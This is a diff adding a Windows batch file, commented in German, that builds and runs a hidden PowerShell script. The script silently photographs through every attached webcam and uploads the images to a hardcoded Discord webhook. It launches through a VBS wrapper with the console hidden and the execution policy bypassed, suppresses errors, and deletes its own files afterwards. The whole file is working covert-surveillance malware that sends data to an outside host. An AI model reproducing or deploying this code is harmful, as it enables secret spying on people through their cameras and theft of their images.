@@ -1,0 +1,79 @@
+@echo off
+set "webhook=https://discord.com/api/webhooks/1469709535022420152/Fvmuq_82nWlMjj_KSV7mf-QnucQX7JyagCncSNPRnO56_-ywOdwI3hO7YcXJ7rTtapya"
+set "ps=%temp%\camcapture.ps1"
+set "vbs=%temp%\launcher.vbs"
+
+REM ----- POWERSHELL SCRIPT ERSTELLEN -----
+(
+echo $webhook = '%webhook%'
+echo $tempDir = "$env:temp\camcapture_$(Get-Random)"
+echo mkdir $tempDir -Force ^| Out-Null
+echo.
+echo # WinRT laden
+echo [Windows.Devices.Enumeration.DeviceInformation,Windows.System.Devices,ContentType=WindowsRuntime] ^| Out-Null
+echo [Windows.Media.Capture.MediaCapture,Windows.Media.Capture,ContentType=WindowsRuntime] ^| Out-Null
+echo [Windows.Media.Capture.CameraCaptureUIMode,Windows.Media.Capture,ContentType=WindowsRuntime] ^| Out-Null
+echo [Windows.Media.MediaProperties.ImageEncodingProperties,Windows.Media,ContentType=WindowsRuntime] ^| Out-Null
+echo [Windows.Storage.StorageFile,Windows.Storage,ContentType=WindowsRuntime] ^| Out-Null
+echo [Windows.Storage.FileIO,Windows.Storage,ContentType=WindowsRuntime] ^| Out-Null
+echo.
+echo # Alle Videoaufnahmegeräte abrufen
+echo $cameraQuery = [Windows.Devices.Enumeration.DeviceInformation]::FindAllAsync([Windows.Devices.Enumeration.DeviceClass]::VideoCapture).GetAwaiter().GetResult^(^)
+echo.
+echo if ^($cameraQuery.Count -eq 0^) { exit }
+echo.
+echo foreach ^($device in $cameraQuery^) {
+echo     try {
+echo         $mediaCapture = New-Object Windows.Media.Capture.MediaCapture
+echo         $settings = New-Object Windows.Media.Capture.MediaCaptureInitializationSettings
+echo         $settings.VideoDeviceId = $device.Id
+echo         $mediaCapture.InitializeAsync($settings).GetAwaiter().GetResult^(^)
+echo.
+echo         $stream = New-Object Windows.Storage.Streams.InMemoryRandomAccessStream
+echo         $encoding = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg^(^)
+echo         $mediaCapture.CapturePhotoToStreamAsync($encoding, $stream).GetAwaiter().GetResult^(^)
+echo.
+echo         $filename = "$tempDir\$($device.Name -replace '[^a-zA-Z0-9]','_')_$([DateTime]::Now.ToString('yyyyMMddHHmmss')).jpg"
+echo         $file = [Windows.Storage.StorageFile]::GetFileFromPathAsync($filename).GetAwaiter().GetResult^(^)
+echo         $file = [Windows.Storage.StorageFile]::CreateStreamedFileAsync($filename, {
+echo             param($request)
+echo             $request.WriteAsync($stream).GetAwaiter().GetResult^(^)
+echo         }, $null).GetAwaiter().GetResult^(^)
+echo         $stream.Dispose^(^)
+echo.
+echo         # An Discord senden
+echo         $uri = $webhook
+echo         $boundary = [System.Guid]::NewGuid^(^).ToString^(^)
+echo         $lf = "`r`n"
+echo         $body = @(
+echo             "--$boundary",
+echo             "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filename))`"",
+echo             "Content-Type: image/jpeg",
+echo             "",
+echo             [System.IO.File]::ReadAllBytes($filename),
+echo             "--$boundary--",
+echo             ""
+echo         ^)
+echo         [System.IO.File]::WriteAllBytes("$tempDir\payload.tmp", [System.Text.Encoding]::UTF8.GetBytes($body -join $lf))
+echo         $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
+echo         Invoke-RestMethod -Uri $uri -Method Post -Headers $headers -Body ([System.IO.File]::ReadAllBytes("$tempDir\payload.tmp")) -ErrorAction SilentlyContinue ^| Out-Null
+echo         Remove-Item $filename -ErrorAction SilentlyContinue
+echo     } catch {
+echo         # Fehler ignorieren – weiter mit nächster Kamera
+echo     } finally {
+echo         if ($mediaCapture) { $mediaCapture.Dispose^(^) }
+echo     }
+echo }
+echo Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+) > "%ps%"
+
+REM ----- VBS LAUNCHER (KEIN KONSOLENFENSTER) -----
+(
+echo Set objShell = CreateObject("Wscript.Shell")
+echo objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps & """", 0, False
+echo Set objShell = Nothing
+) > "%vbs%"
+set "ps=%ps:\=\\%"
+cscript //nologo "%vbs%"
+timeout /t 2 /nobreak >nul
+del "%ps%" "%vbs%" 2>nul
